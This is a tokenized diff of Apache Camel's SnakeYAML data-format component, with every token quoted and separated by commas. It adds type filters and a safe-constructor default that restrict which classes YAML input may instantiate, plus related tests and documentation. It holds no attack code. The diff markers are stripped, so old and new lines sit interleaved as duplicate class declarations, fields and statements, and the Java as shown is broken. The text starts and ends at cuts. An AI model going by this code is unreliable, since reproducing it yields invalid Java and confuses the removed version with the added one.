"==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "|", "Name", "|", "Type", "|", "Default", "|", "Description", "|", "unmarshalType", "|", "`", "Class", "`", "|", "`", "Object", ".", "class", "`", "|", "Class", "of", "the", "object", "to", "be", "created", "|", "classLoader", "|", "ClassLoader", "|", "null", "|", "The", "classloader", "to", "use", "to", "instantiate", "objects", "|", "constructor", "|", "String", "|", "null", "|", "A", "reference", "to", "an", "org", ".", "yaml", ".", "snakeyaml", ".", "constructor", ".", "BaseConstructor", "instance", "in", "the", "registry", "|", "representer", "|", "String", "|", "null", "|", "A", "reference", "to", "an", "org", ".", "yaml", ".", "snakeyaml", ".", "representer", ".", "Representer", "instance", "in", "the", "registry", "|", "dumperOptions", "|", "String", "|", "null", "|", "A", "reference", "to", "an", "org", ".", "yaml", ".", "snakeyaml", ".", "DumperOptions", "instance", "in", "the", "registry", "|", "resolver", "|", "String", "|", "null", "|", "A", "reference", "to", "an", "org", ".", "yaml", ".", "snakeyaml", ".", "resolver", ".", "Resolver", "instance", "in", "the", "registry", "|", "useApplicationContextClassLoader", "|", "Boolean", "|", "true", "|", "To", "use", "CamelContext", "'", "s", "ApplicationContextClassLoader", "if", "no", "custom", "class", "loader", "is", "set", "and", "ApplicationContextClassLoader", "is", "provided", "|", "prettyFlow", "|", "Boolean", "|", "false", "|", "Force", "the", "emitter", "to", "produce", "a", "pretty", "YAML", "document", "when", "using", "the", "flow", "style", "|", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "==", "=", "[", "[", "YAMLDataFormat", "-", "DependenciesforSnakeYAML", "]", "]", "Dependencies", "for", "SnakeYAML", "@", "@", "-", "21", ",", "10", "+", "21", ",", "14", "@", "@", "import", "java", ".", "io", ".", "OutputStream", ";", "import", "java", ".", "io", ".", "OutputStreamWriter", ";", "import", "java", ".", "lang", ".", "ref", ".", "WeakReference", ";", "import", "java", ".", "util", ".", "LinkedHashMap", ";", "import", "java", ".", "util", ".", "LinkedList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "concurrent", ".", "ConcurrentHashMap", ";", "import", "java", ".", "util", ".", "concurrent", ".", "ConcurrentMap", ";", "import", "java", ".", "util", ".", "concurrent", ".", "CopyOnWriteArrayList", ";", "import", "org", ".", "apache", ".", "camel", ".", "CamelContext", ";", "import", "org", ".", "apache", ".", "camel", ".", "Exchange", ";", "@", "@", "-", "38", ",", "38", "+", "42", ",", "43", "@", "@", "import", "org", ".", "yaml", ".", "snakeyaml", ".", "constructor", ".", "BaseConstructor", ";", "import", "org", ".", "yaml", ".", "snakeyaml", ".", "constructor", ".", "Constructor", ";", "import", "org", ".", "yaml", ".", "snakeyaml", ".", "constructor", ".", "CustomClassLoaderConstructor", ";", "import", "org", ".", "yaml", ".", "snakeyaml", ".", "constructor", ".", "SafeConstructor", ";", "import", "org", ".", "yaml", ".", "snakeyaml", ".", "nodes", ".", "Tag", ";", "import", "org", ".", "yaml", ".", "snakeyaml", ".", "representer", ".", "Representer", ";", "import", "org", ".", "yaml", ".", "snakeyaml", ".", "resolver", ".", "Resolver", ";", "/", "**", "*", "A", "<", "a", "href", "=", "\"", "http", ":", "//", "camel", ".", "apache", ".", "org", "/", "data", "-", "format", ".", "html", "\"", ">", "data", "format", "<", "/", "a", ">", "(", "{@", "link", "DataFormat", "}", ")", "*", "using", "<", "a", "href", "=", "\"", "http", ":", "//", "www", ".", "snakeyaml", ".", "org", "\"", ">", "SnakeYAML", "<", "/", "a", ">", "to", "marshal", "to", "and", "from", "YAML", ".", "*", "/", "public", "class", "SnakeYAMLDataFormat", "extends", "ServiceSupport", "implements", "DataFormat", ",", "DataFormatName", "{", "private", "ThreadLocal", "<", "WeakReference", "<", "Yaml", ">", ">", "yamlCache", ";", "public", "final", "class", "SnakeYAMLDataFormat", "extends", "ServiceSupport", "implements", "DataFormat", ",", "DataFormatName", "{", "private", "final", "ThreadLocal", "<", "WeakReference", "<", "Yaml", ">", ">", "yamlCache", ";", "private", "BaseConstructor", "constructor", ";", "private", "Representer", "representer", ";", "private", "DumperOptions", "dumperOptions", ";", "private", "Resolver", "resolver", ";", "private", "ClassLoader", "classLoader", ";", "private", "Class", "<", "?>", "unmarshalType", ";", "private", "List", "<", "TypeDescription", ">", "typeDescriptions", ";", "private", "Map", "<", "Class", "<", "?>", ",", "Tag", ">", "classTags", ";", "private", "ConcurrentMap", "<", "Class", "<", "?>", ",", "Tag", ">", "classTags", ";", "private", "boolean", "useApplicationContextClassLoader", ";", "private", "boolean", "prettyFlow", ";", "private", "boolean", "allowAnyType", ";", "private", "List", "<", "TypeFilter", ">", "typeFilters", ";", "public", "SnakeYAMLDataFormat", "(", ")", "{", "this", "(", "Object", ".", "class", ")", ";", "this", "(", "null", ")", ";", "}", "public", "SnakeYAMLDataFormat", "(", "Class", "<", "?>", "type", ")", "{", "this", ".", "unmarshalType", "=", "type", ";", "this", ".", "yamlCache", "=", "new", "ThreadLocal", "<", ">(", ");", "this", ".", "useApplicationContextClassLoader", "=", "true", ";", "this", ".", "prettyFlow", "=", "false", ";", "this", ".", "allowAnyType", "=", "false", ";", "if", "(", "type", "!", "=", "null", ")", "{", "setUnmarshalType", "(", "type", ")", ";", "}", "}", "@", "Override", "@", "@", "-", "79", ",", "15", "+", "88", ",", "16", "@", "@", "public", "String", "getDataFormatName", "(", ")", "{", "@", "Override", "public", "void", "marshal", "(", "final", "Exchange", "exchange", ",", "final", "Object", "graph", ",", "final", "OutputStream", "stream", ")", "throws", "Exception", "{", "try", "(", "final", "OutputStreamWriter", "osw", "=", "new", "OutputStreamWriter", "(", "stream", ",", "IOHelper", ".", "getCharsetName", "(", "exchange", ")", "))", "{", "try", "(", "OutputStreamWriter", "osw", "=", "new", "OutputStreamWriter", "(", "stream", ",", "IOHelper", ".", "getCharsetName", "(", "exchange", ")", "))", "{", "getYaml", "(", "exchange", ".", "getContext", "(", "))", ".", "dump", "(", "graph", ",", "osw", ")", ";", "}", "}", "@", "Override", "public", "Object", "unmarshal", "(", "final", "Exchange", "exchange", ",", "final", "InputStream", "stream", ")", "throws", "Exception", "{", "try", "(", "final", "InputStreamReader", "isr", "=", "new", "InputStreamReader", "(", "stream", ",", "IOHelper", ".", "getCharsetName", "(", "exchange", ")", "))", "{", "return", "getYaml", "(", "exchange", ".", "getContext", "(", "))", ".", "loadAs", "(", "isr", ",", "unmarshalType", ")", ";", "try", "(", "InputStreamReader", "isr", "=", "new", "InputStreamReader", "(", "stream", ",", "IOHelper", ".", "getCharsetName", "(", "exchange", ")", "))", "{", "Class", "<", "?>", "unmarshalObjectType", "=", "unmarshalType", "!", "=", "null", "?", "unmarshalType", ":", "Object", ".", "class", ";", "return", "getYaml", "(", "exchange", ".", "getContext", "(", "))", ".", "loadAs", "(", "isr", ",", "unmarshalObjectType", ")", ";", "}", "}", "@", "@", "-", "105", ",", "17", "+", "115", ",", "26", "@", "@", "protected", "Yaml", "getYaml", "(", "CamelContext", "context", ")", "{", "DumperOptions", "yamlDumperOptions", "=", "this", ".", "dumperOptions", ";", "Resolver", "yamlResolver", "=", "this", ".", "resolver", ";", "ClassLoader", "yamlClassLoader", "=", "this", ".", "classLoader", ";", "Collection", "<", "TypeFilter", ">", "yamlTypeFilters", "=", "this", ".", "typeFilters", ";", "if", "(", "yamlClassLoader", "=", "=", "null", "&", "&", "useApplicationContextClassLoader", ")", "{", "yamlClassLoader", "=", "context", ".", "getApplicationContextClassLoader", "(", ");", "}", "if", "(", "yamlConstructor", "=", "=", "null", ")", "{", "yamlConstructor", "=", "yamlClassLoader", "=", "=", "null", "?", "new", "Constructor", "(", ")", ":", "new", "CustomClassLoaderConstructor", "(", "yamlClassLoader", ")", ";", "if", "(", "allowAnyType", ")", "{", "yamlTypeFilters", "=", "Collections", ".", "singletonList", "(", "TypeFilters", ".", "allowAll", "(", "))", ";", "}", "if", "(", "yamlTypeFilters", "!", "=", "null", ")", "{", "yamlConstructor", "=", "yamlClassLoader", "!", "=", "null", "?", "typeFilterConstructor", "(", "yamlClassLoader", ",", "yamlTypeFilters", ")", ":", "typeFilterConstructor", "(", "yamlTypeFilters", ")", ";", "}", "else", "{", "yamlConstructor", "=", "new", "SafeConstructor", "(", ");", "}", "if", "(", "typeDescriptions", "!", "=", "null", ")", "{", "if", "(", "typeDescriptions", "!", "=", "null", "&", "&", "yamlConstructor", "instanceof", "Constructor", ")", "{", "for", "(", "TypeDescription", "typeDescription", ":", "typeDescriptions", ")", "{", "(", "(", "Constructor", ")", "yamlConstructor", ")", ".", "addTypeDescription", "(", "typeDescription", ")", ";", "}", "@", "@", "-", "219", ",", "6", "+", "238", ",", "7", "@", "@", "public", "void", "setClassLoader", "(", "ClassLoader", "classLoader", ")", "{", "*", "/", "public", "void", "setUnmarshalType", "(", "Class", "<", "?>", "unmarshalType", ")", "{", "this", ".", "unmarshalType", "=", "unmarshalType", ";", "addTypeFilters", "(", "TypeFilters", ".", "types", "(", "unmarshalType", ")", ");", "}", "public", "List", "<", "TypeDescription", ">", "getTypeDescriptions", "(", ")", "{", "@", "@", "-", "229", ",", "22", "+", "249", ",", "24", "@", "@", "public", "void", "setUnmarshalType", "(", "Class", "<", "?>", "unmarshalType", ")", "{", "*", "Make", "YAML", "aware", "how", "to", "parse", "a", "custom", "Class", ".", "*", "/", "public", "void", "setTypeDescriptions", "(", "List", "<", "TypeDescription", ">", "typeDescriptions", ")", "{", "this", ".", "typeDescriptions", "=", "typeDescriptions", ";", "this", ".", "typeDescriptions", "=", "new", "CopyOnWriteArrayList", "<", ">(", "typeDescriptions", ")", ";", "}", "public", "void", "addTypeDescriptions", "(", "TypeDescription", ".", "..", "typeDescriptions", ")", "{", "public", "void", "addTypeDescriptions", "(", "Collection", "<", "TypeDescription", ">", "typeDescriptions", ")", "{", "if", "(", "this", ".", "typeDescriptions", "=", "=", "null", ")", "{", "this", ".", "typeDescriptions", "=", "new", "LinkedList", "<", ">(", ");", "this", ".", "typeDescriptions", "=", "new", "CopyOnWriteArrayList", "<", ">(", ");", "}", "for", "(", "TypeDescription", "typeDescription", ":", "typeDescriptions", ")", "{", "this", ".", "typeDescriptions", ".", "add", "(", "typeDescription", ")", ";", "}", "this", ".", "typeDescriptions", ".", "addAll", "(", "typeDescriptions", ")", ";", "}", "public", "void", "addTypeDescriptions", "(", "TypeDescription", ".", "..", "typeDescriptions", ")", "{", "addTypeDescriptions", "(", "Arrays", ".", "asList", "(", "typeDescriptions", ")", ");", "}", "public", "void", "addTypeDescription", "(", "Class", "<", "?>", "type", ",", "Tag", "tag", ")", "{", "if", "(", "this", ".", "typeDescriptions", "=", "=", "null", ")", "{", "this", ".", "typeDescriptions", "=", "new", "LinkedList", "<", ">(", ");", "this", ".", "typeDescriptions", "=", "new", "CopyOnWriteArrayList", "<", ">(", ");", "}", "this", ".", "typeDescriptions", ".", "add", "(", "new", "TypeDescription", "(", "type", ",", "tag", ")", ");", "@", "@", "-", "258", ",", "12", "+", "280", ",", "13", "@", "@", "public", "void", "addTypeDescription", "(", "Class", "<", "?>", "type", ",", "Tag", "tag", ")", "{", "*", "Define", "a", "tag", "for", "the", "<", "code", ">", "Class", "<", "/", "code", ">", "to", "serialize", ".", "*", "/", "public", "void", "setClassTags", "(", "Map", "<", "Class", "<", "?>", ",", "Tag", ">", "classTags", ")", "{", "this", ".", "classTags", "=", "classTags", ";", "this", ".", "classTags", "=", "new", "ConcurrentHashMap", "<", ">(", ");", "this", ".", "classTags", ".", "putAll", "(", "classTags", ")", ";", "}", "public", "void", "addClassTags", "(", "Class", "<", "?>", "type", ",", "Tag", "tag", ")", "{", "if", "(", "this", ".", "classTags", "=", "=", "null", ")", "{", "this", ".", "classTags", "=", "new", "LinkedHashMap", "<", ">(", ");", "this", ".", "classTags", "=", "new", "ConcurrentHashMap", "<", ">(", ");", "}", "this", ".", "classTags", ".", "put", "(", "type", ",", "tag", ")", ";", "@", "@", "-", "301", ",", "4", "+", "324", ",", "76", "@", "@", "public", "void", "addTag", "(", "Class", "<", "?>", "type", ",", "Tag", "tag", ")", "{", "addClassTags", "(", "type", ",", "tag", ")", ";", "addTypeDescription", "(", "type", ",", "tag", ")", ";", "}", "public", "List", "<", "TypeFilter", ">", "getTypeFilters", "(", ")", "{", "return", "typeFilters", ";", "}", "/", "**", "*", "Set", "the", "types", "SnakeYAML", "is", "allowed", "to", "un", "-", "marshall", "*", "/", "public", "void", "setTypeFilters", "(", "List", "<", "TypeFilter", ">", "typeFilters", ")", "{", "this", ".", "typeFilters", "=", "new", "CopyOnWriteArrayList", "<", ">(", "typeFilters", ")", ";", "}", "public", "void", "setTypeFilterDefinitions", "(", "List", "<", "String", ">", "typeFilterDefinitions", ")", "{", "this", ".", "typeFilters", "=", "new", "CopyOnWriteArrayList", "<", ">(", ");", "for", "(", "String", "definition", ":", "typeFilterDefinitions", ")", "{", "TypeFilters", ".", "valueOf", "(", "definition", ")", ".", "ifPresent", "(", "this", ".", "typeFilters", ":", ":", "add", ")", ";", "}", "}", "public", "void", "addTypeFilters", "(", "Collection", "<", "TypeFilter", ">", "typeFilters", ")", "{", "if", "(", "this", ".", "typeFilters", "=", "=", "null", ")", "{", "this", ".", "typeFilters", "=", "new", "CopyOnWriteArrayList", "<", ">(", ");", "}", "this", ".", "typeFilters", ".", "addAll", "(", "typeFilters", ")", ";", "}", "public", "void", "addTypeFilters", "(", "TypeFilter", ".", "..", "typeFilters", ")", "{", "addTypeFilters", "(", "Arrays", ".", "asList", "(", "typeFilters", ")", ");", "}", "public", "boolean", "isAllowAnyType", "(", ")", "{", "return", "allowAnyType", ";", "}", "/", "**", "*", "Allow", "any", "class", "to", "be", "un", "-", "marshaled", ",", "same", "as", "setTypeFilters", "(", "TypeFilters", ".", "allowAll", "(", "))", "*", "/", "public", "void", "setAllowAnyType", "(", "boolean", "allowAnyType", ")", "{", "this", ".", "allowAnyType", "=", "allowAnyType", ";", "}", "/", "/", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "/", "Constructors", "/", "/", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "private", "static", "Constructor", "typeFilterConstructor", "(", "final", "Collection", "<", "TypeFilter", ">", "typeFilters", ")", "{", "return", "new", "Constructor", "(", ")", "{", "@", "Override", "protected", "Class", "<", "?>", "getClassForName", "(", "String", "name", ")", "throws", "ClassNotFoundException", "{", "if", "(", "typeFilters", ".", "stream", "(", ").", "noneMatch", "(", "f", "-", ">", "f", ".", "test", "(", "name", ")", "))", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "Type", "\"", "+", "name", "+", "\"", "is", "not", "allowed", "\"", ");", "}", "return", "super", ".", "getClassForName", "(", "name", ")", ";", "}", "}", ";", "}", "private", "static", "Constructor", "typeFilterConstructor", "(", "final", "ClassLoader", "classLoader", ",", "final", "Collection", "<", "TypeFilter", ">", "typeFilters", ")", "{", "return", "new", "CustomClassLoaderConstructor", "(", "classLoader", ")", "{", "@", "Override", "protected", "Class", "<", "?>", "getClassForName", "(", "String", "name", ")", "throws", "ClassNotFoundException", "{", "if", "(", "typeFilters", ".", "stream", "(", ").", "noneMatch", "(", "f", "-", ">", "f", ".", "test", "(", "name", ")", "))", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "Type", "\"", "+", "name", "+", "\"", "is", "not", "allowed", "\"", ");", "}", "return", "super", ".", "getClassForName", "(", "name", ")", ";", "}", "}", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "23", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ";", "import", "java", ".", "util", ".", "function", ".", "Predicate", ";", "@", "FunctionalInterface", "public", "interface", "TypeFilter", "extends", "Predicate", "<", "String", ">", "{", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "119", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Optional", ";", "import", "java", ".", "util", ".", "function", ".", "Predicate", ";", "import", "java", ".", "util", ".", "regex", ".", "Pattern", ";", "import", "java", ".", "util", ".", "stream", ".", "Collectors", ";", "import", "org", ".", "apache", ".", "camel", ".", "util", ".", "StringHelper", ";", "public", "final", "class", "TypeFilters", "{", "private", "TypeFilters", "(", ")", "{", "}", "public", "static", "final", "class", "RegExp", "implements", "TypeFilter", "{", "private", "final", "List", "<", "Predicate", "<", "String", ">", ">", "predicates", ";", "public", "RegExp", "(", "String", "pattern", ")", "{", "this", ".", "predicates", "=", "Collections", ".", "singletonList", "(", "Pattern", ".", "compile", "(", "pattern", ")", ".", "asPredicate", "(", "))", ";", "}", "public", "RegExp", "(", "Collection", "<", "String", ">", "patterns", ")", "{", "this", ".", "predicates", "=", "patterns", ".", "stream", "(", ")", ".", "map", "(", "Pattern", ":", ":", "compile", ")", ".", "map", "(", "Pattern", ":", ":", "asPredicate", ")", ".", "collect", "(", "Collectors", ".", "toList", "(", "))", ";", "}", "@", "Override", "public", "boolean", "test", "(", "String", "type", ")", "{", "return", "predicates", ".", "stream", "(", ").", "anyMatch", "(", "p", "-", ">", "p", ".", "test", "(", "type", ")", ");", "}", "}", "public", "static", "final", "class", "TypeName", "implements", "TypeFilter", "{", "private", "final", "List", "<", "String", ">", "values", ";", "public", "TypeName", "(", "String", "value", ")", "{", "this", ".", "values", "=", "Collections", ".", "singletonList", "(", "value", ")", ";", "}", "public", "TypeName", "(", "Collection", "<", "String", ">", "values", ")", "{", "this", ".", "values", "=", "new", "ArrayList", "<", ">(", "values", ")", ";", "}", "@", "Override", "public", "boolean", "test", "(", "String", "type", ")", "{", "return", "this", ".", "values", ".", "contains", "(", "type", ")", ";", "}", "}", "/", "/", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "/", "Helpers", "/", "/", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "public", "static", "Optional", "<", "TypeFilter", ">", "valueOf", "(", "String", "definition", ")", "{", "String", "type", "=", "StringHelper", ".", "before", "(", "definition", ",", "\"", ":\"", ");", "if", "(", "type", "=", "=", "null", "|", "|", "\"", "type", "\"", ".", "equals", "(", "type", ")", ")", "{", "return", "StringHelper", ".", "after", "(", "definition", ",", "\"", ":\"", ",", "TypeName", ":", ":", "new", ")", ";", "}", "else", "if", "(", "\"", "regexp", "\"", ".", "equals", "(", "type", ")", ")", "{", "return", "StringHelper", ".", "after", "(", "definition", ",", "\"", ":\"", ",", "RegExp", ":", ":", "new", ")", ";", "}", "return", "Optional", ".", "empty", "(", ");", "}", "public", "static", "TypeFilter", "regexp", "(", "String", ".", "..", "patterns", ")", "{", "return", "new", "RegExp", "(", "Arrays", ".", "asList", "(", "patterns", ")", ");", "}", "public", "static", "TypeFilter", "regexp", "(", "Collection", "<", "String", ">", "patterns", ")", "{", "return", "new", "RegExp", "(", "patterns", ")", ";", "}", "public", "static", "TypeFilter", "typeNames", "(", "Collection", "<", "String", ">", "values", ")", "{", "return", "new", "TypeName", "(", "values", ")", ";", "}", "public", "static", "TypeFilter", "typeNames", "(", "String", ".", "..", "values", ")", "{", "return", "typeNames", "(", "Arrays", ".", "asList", "(", "values", ")", ");", "}", "public", "static", "TypeFilter", "types", "(", "Collection", "<", "Class", "<", "?>", ">", "values", ")", "{", "return", "new", "TypeName", "(", "values", ".", "stream", "(", ").", "map", "(", "c", "-", ">", "c", ".", "getName", "(", "))", ".", "collect", "(", "Collectors", ".", "toList", "(", "))", ");", "}", "public", "static", "TypeFilter", "types", "(", "Class", "<", "?>", "..", ".", "values", ")", "{", "return", "types", "(", "Arrays", ".", "asList", "(", "values", ")", ");", "}", "public", "static", "TypeFilter", "allowAll", "(", ")", "{", "return", "s", "-", ">", "true", ";", "}", "public", "static", "TypeFilter", "allowNone", "(", ")", "{", "return", "s", "-", ">", "false", ";", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "48", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "snakeyaml", ";", "import", "org", ".", "apache", ".", "camel", ".", "test", ".", "blueprint", ".", "CamelBlueprintTestSupport", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "class", "SnakeYAMLBlueprintTypeFilterTest", "extends", "CamelBlueprintTestSupport", "{", "@", "Test", "public", "void", "testSafeConstructor", "(", ")", "throws", "Exception", "{", "SnakeYAMLTypeFilterHelper", ".", "testSafeConstructor", "(", "template", ")", ";", "}", "@", "Test", "public", "void", "testTypeConstructor", "(", ")", "throws", "Exception", "{", "SnakeYAMLTypeFilterHelper", ".", "testTypeConstructor", "(", "template", ")", ";", "}", "@", "Test", "public", "void", "testTypeConstructorFromDefinition", "(", ")", "throws", "Exception", "{", "SnakeYAMLTypeFilterHelper", ".", "testTypeConstructorFromDefinition", "(", "template", ")", ";", "}", "@", "Test", "public", "void", "testAllowAllConstructor", "(", ")", "throws", "Exception", "{", "SnakeYAMLTypeFilterHelper", ".", "testAllowAllConstructor", "(", "template", ")", ";", "}", "@", "Override", "protected", "String", "getBlueprintDescriptor", "(", ")", "{", "return", "\"", "OSGI", "-", "INF", "/", "blueprint", "/", "blueprint", "-", "typefilter", ".", "xml", "\"", ";", "}", "}", "@", "@", "-", "23", ",", "17", "+", "23", ",", "18", "@", "@", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "springframework", ".", "context", ".", "support", ".", "AbstractXmlApplicationContext", ";", "import", "org", ".", "springframework", ".", "context", ".", "support", ".", "ClassPathXmlApplicationContext", ";", "import", "org", ".", "springframework", ".", "test", ".", "annotation", ".", "DirtiesContext", ";", "public", "class", "SnakeYAMLSpringMarshalTest", "extends", "CamelSpringTestSupport", "{", "@", "DirtiesContext", "public", "class", "SnakeYAMLSpringTest", "extends", "CamelSpringTestSupport", "{", "@", "Test", "public", "void", "testMarshalAndUnmarshalMap", "(", ")", "throws", "Exception", "{", "Map", "<", "String", ",", "String", ">", "in", "=", "new", "HashMap", "<", ">(", ");", "in", ".", "put", "(", "\"", "name", "\"", ",", "\"", "Camel", "\"", ");", "SnakeYAMLMarshalTestHelper", ".", "marshalAndUnmarshal", "(", "SnakeYAMLTestHelper", ".", "marshalAndUnmarshal", "(", "context", "(", "),", "SnakeYAMLMarshalTestHelper", ".", "createTestMap", "(", "),", "SnakeYAMLTestHelper", ".", "createTestMap", "(", "),", "\"", "mock", ":", "reverse", "\"", ",", "\"", "direct", ":", "in", "\"", ",", "\"", "direct", ":", "back", "\"", ",", "@", "@", "-", "43", ",", "9", "+", "44", ",", "9", "@", "@", "public", "void", "testMarshalAndUnmarshalMap", "(", ")", "throws", "Exception", "{", "@", "Test", "public", "void", "testMarshalAndUnmarshalPojo", "(", ")", "throws", "Exception", "{", "SnakeYAMLMarshalTestHelper", ".", "marshalAndUnmarshal", "(", "SnakeYAMLTestHelper", ".", "marshalAndUnmarshal", "(", "context", "(", "),", "SnakeYAMLMarshalTestHelper", ".", "createTestPojo", "(", "),", "SnakeYAMLTestHelper", ".", "createTestPojo", "(", "),", "\"", "mock", ":", "reversePojo", "\"", ",", "\"", "direct", ":", "inPojo", "\"", ",", "\"", "direct", ":", "backPojo", "\"", ",", "@", "@", "-", "55", ",", "9", "+", "56", ",", "9", "@", "@", "public", "void", "testMarshalAndUnmarshalPojo", "(", ")", "throws", "Exception", "{", "@", "Test", "public", "void", "testMarshalAndUnmarshalPojoWithPrettyFlow", "(", ")", "throws", "Exception", "{", "SnakeYAMLMarshalTestHelper", ".", "marshalAndUnmarshal", "(", "SnakeYAMLTestHelper", ".", "marshalAndUnmarshal", "(", "context", "(", "),", "SnakeYAMLMarshalTestHelper", ".", "createTestPojo", "(", "),", "SnakeYAMLTestHelper", ".", "createTestPojo", "(", "),", "\"", "mock", ":", "reversePojoWithPrettyFlow", "\"", ",", "\"", "direct", ":", "inPojoWithPrettyFlow", "\"", ",", "\"", "direct", ":", "backPojoWithPrettyFlow", "\"", ",", "@", "@", "-", "67", ",", "7", "+", "68", ",", "6", "@", "@", "public", "void", "testMarshalAndUnmarshalPojoWithPrettyFlow", "(", ")", "throws", "Exception", "{", "@", "Override", "protected", "AbstractXmlApplicationContext", "createApplicationContext", "(", ")", "{", "return", "new", "ClassPathXmlApplicationContext", "(", "\"", "org", "/", "apache", "/", "camel", "/", "component", "/", "snakeyaml", "/", "SnakeYAMLSpringMarshalTest", ".", "xml", "\"", ");", "return", "new", "ClassPathXmlApplicationContext", "(", "\"", "org", "/", "apache", "/", "camel", "/", "component", "/", "snakeyaml", "/", "SnakeYAMLSpringTest", ".", "xml", "\"", ");", "}", "}", "@", "@", "-", "0", ",", "0", "+", "1", ",", "51", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", 